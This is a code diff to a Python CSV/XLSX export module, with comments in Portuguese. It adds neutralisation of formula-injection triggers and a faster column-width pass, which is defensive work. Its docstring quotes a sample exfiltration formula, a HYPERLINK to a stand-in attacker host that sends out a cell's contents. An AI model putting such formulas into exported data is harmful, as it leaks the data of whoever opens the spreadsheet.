@@ -10,6 +10,41 @@ import openpyxl
 from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
 from openpyxl.utils import get_column_letter
 
+# Caracteres que o Excel/LibreOffice/Sheets interpretam como in\u00edcio de
+# f\u00f3rmula quando s\u00e3o o primeiro caractere de uma c\u00e9lula.
+_CARACTERES_FORMULA = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _neutralizar_formula(item: Any) -> str:
+    """Converte a c\u00e9lula para string, prefixando com ap\u00f3strofo se o valor
+    textual come\u00e7ar com um gatilho de f\u00f3rmula.
+
+    Os dados exportados v\u00eam de campos livres preenchidos por usu\u00e1rios
+    (descri\u00e7\u00e3o de pane, observa\u00e7\u00f5es de inspe\u00e7\u00e3o, t\u00edtulo de tarefa). Sem
+    isso, um valor como `=HYPERLINK("http://atacante/?d="&A1,"clique")`
+    executa no Excel/LibreOffice de quem abrir o relat\u00f3rio exportado \u2014 CSV/
+    Formula Injection (OWASP). O ap\u00f3strofo faz a planilha tratar o conte\u00fado
+    como texto literal, sem alterar o valor vis\u00edvel para o usu\u00e1rio.
+
+    N\u00fameros (`int`/`float`) nunca s\u00e3o neutralizados \u2014 um `-5` leg\u00edtimo
+    (ex.: varia\u00e7\u00e3o negativa numa m\u00e9trica) n\u00e3o \u00e9 um gatilho de f\u00f3rmula nesse
+    contexto, \u00e9 s\u00f3 um n\u00famero negativo, e n\u00e3o deve ganhar um ap\u00f3strofo
+    vis\u00edvel. A checagem de tipo acontece ANTES da convers\u00e3o para string,
+    ent\u00e3o isso n\u00e3o depende do texto resultante come\u00e7ar com "-".
+    """
+    if item is None:
+        return ""
+    if isinstance(item, (int, float)) and not isinstance(item, bool):
+        return str(item)
+    texto = str(item)
+    if texto and texto[0] in _CARACTERES_FORMULA:
+        return "'" + texto
+    return texto
+
+
+def _formatar_linha(row: Sequence[Any]) -> list[str]:
+    return [_neutralizar_formula(item) for item in row]
+
 
 def gerar_csv(headers: list[str], rows: Sequence[Sequence[Any]]) -> str:
     """Gera uma string CSV formatada (UTF-8 com BOM para Excel carregar acentos corretamente)."""
@@ -19,7 +54,7 @@ def gerar_csv(headers: list[str], rows: Sequence[Sequence[Any]]) -> str:
     writer = csv.writer(output, delimiter=";", quoting=csv.QUOTE_MINIMAL)
     writer.writerow(headers)
     for row in rows:
-        writer.writerow([str(item) if item is not None else "" for item in row])
+        writer.writerow(_formatar_linha(row))
     return output.getvalue()
 
 
@@ -50,24 +85,24 @@ def gerar_xlsx(titulo_aba: str, headers: list[str], rows: Sequence[Sequence[Any]
         cell.fill = header_fill
         cell.alignment = header_alignment
 
-    # Escrever Linhas de Dados
+    # Escrever Linhas de Dados + acumular a largura máxima de cada coluna na
+    # MESMA passada (item #7/Etapa 5: antes, `for col in ws.columns` releia
+    # todas as células já escritas numa segunda passada completa só para
+    # calcular largura — dobra o custo de CPU proporcional ao volume
+    # exportado, sem reduzir o pico de memória do Workbook em si).
+    largura_maxima = [len(h) for h in headers]
     for row_idx, row_data in enumerate(rows, start=2):
-        formatted_row = [str(item) if item is not None else "" for item in row_data]
-        ws.append(formatted_row)
+        linha_formatada = _formatar_linha(row_data)
+        ws.append(linha_formatada)
         for col_idx in range(1, len(headers) + 1):
             cell = ws.cell(row=row_idx, column=col_idx)
             cell.font = data_font
             cell.border = thin_border
+            if col_idx <= len(largura_maxima):
+                largura_maxima[col_idx - 1] = max(largura_maxima[col_idx - 1], len(str(cell.value or "")))
 
-    # Ajustar largura automática de colunas
-    for col in ws.columns:
-        max_len = 0
-        col_letter = get_column_letter(col[0].column)
-        for cell in col:
-            val_str = str(cell.value or "")
-            if len(val_str) > max_len:
-                max_len = len(val_str)
-        ws.column_dimensions[col_letter].width = max(max_len + 4, 12)
+    for col_idx, max_len in enumerate(largura_maxima, start=1):
+        ws.column_dimensions[get_column_letter(col_idx)].width = max(max_len + 4, 12)
 
     output = io.BytesIO()
     wb.save(output)
